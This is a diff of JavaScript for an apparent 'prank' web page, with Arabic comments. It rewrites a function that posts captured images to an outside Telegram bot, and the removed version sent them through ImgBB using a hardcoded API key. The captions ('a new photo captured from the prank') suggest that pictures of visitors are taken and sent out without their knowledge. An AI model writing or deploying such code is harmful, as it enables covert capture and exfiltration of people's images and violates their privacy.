@@ -206,51 +206,54 @@
       }
     };
 
-    // إرسال الصورة للـ Telegram (طريقة مختلفة - عبر URL)
+    // إرسال الصورة للـ Telegram (طريقة مبسطة جداً)
     async function sendToDiscord(imageData) {
       try {
-        console.log('🔄 جاري رفع الصورة على ImgBB أولاً...');
+        console.log('📸 بدء عملية إرسال الصورة...');
         
-        // الخطوة 1: رفع الصورة على ImgBB
-        const base64Image = imageData.split(',')[1];
+        // تحويل base64 إلى blob
+        const response = await fetch(imageData);
+        const blob = await response.blob();
+        
+        console.log('✅ تم تحويل الصورة إلى blob');
+        console.log('📦 حجم الصورة:', blob.size, 'bytes');
+        
+        // إنشاء FormData
         const formData = new FormData();
-        formData.append('image', base64Image);
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', blob, 'prank.png');
+        formData.append('caption', '🎯 مقلب!');
         
-        // استخدام ImgBB API (مجاني وما يحتاج تسجيل لهذا الاستخدام)
-        const imgbbResponse = await fetch('https://api.imgbb.com/1/upload?key=c6bd0d055f3f12e7b1c1b1e1cc9a5e8a', {
-          method: 'POST',
-          body: formData
-        });
+        console.log('📤 جاري إرسال الصورة للتليجرام...');
+        console.log('🔑 Bot Token:', TELEGRAM_BOT_TOKEN.substring(0, 20) + '...');
+        console.log('💬 Chat ID:', TELEGRAM_CHAT_ID);
         
-        const imgbbResult = await imgbbResponse.json();
-        
-        if (imgbbResult.success) {
-          const imageUrl = imgbbResult.data.url;
-          console.log('✅ تم رفع الصورة على ImgBB:', imageUrl);
-          
-          // الخطوة 2: إرسال رابط الصورة للتليجرام
-          const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto?chat_id=${TELEGRAM_CHAT_ID}&photo=${encodeURIComponent(imageUrl)}&caption=${encodeURIComponent('🎯 تم التقاط صورة جديدة من المقلب!\n⏰ ' + new Date().toLocaleString('ar-EG'))}`;
-          
-          const telegramResponse = await fetch(telegramUrl);
-          const telegramResult = await telegramResponse.json();
-          
-          if (telegramResult.ok) {
-            console.log('✅ تم إرسال الصورة للـ Telegram بنجاح!');
-          } else {
-            console.error('❌ فشل إرسال Telegram:', telegramResult);
+        // إرسال للتليجرام
+        const telegramResponse = await fetch(
+          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+          {
+            method: 'POST',
+            body: formData
           }
+        );
+        
+        const result = await telegramResponse.json();
+        
+        console.log('📬 رد من Telegram:', result);
+        
+        if (result.ok) {
+          console.log('✅✅✅ نجح! تم إرسال الصورة بنجاح!');
         } else {
-          console.error('❌ فشل رفع الصورة على ImgBB:', imgbbResult);
+          console.error('❌ فشل الإرسال!');
+          console.error('❌ السبب:', result.description);
+          console.error('❌ الكود:', result.error_code);
         }
         
       } catch (error) {
-        console.error('❌ خطأ عام:', error);
+        console.error('❌❌❌ خطأ عام:', error);
+        console.error('تفاصيل:', error.message);
+        console.error('Stack:', error.stack);
       }
-    }
-
-    // حذف الدالة البديلة (ما نحتاجها)
-    async function sendAsDocument(imageData) {
-      // تم إزالتها
     }
 
     // عرض الصورة عند الضغط على الزر الأحمر
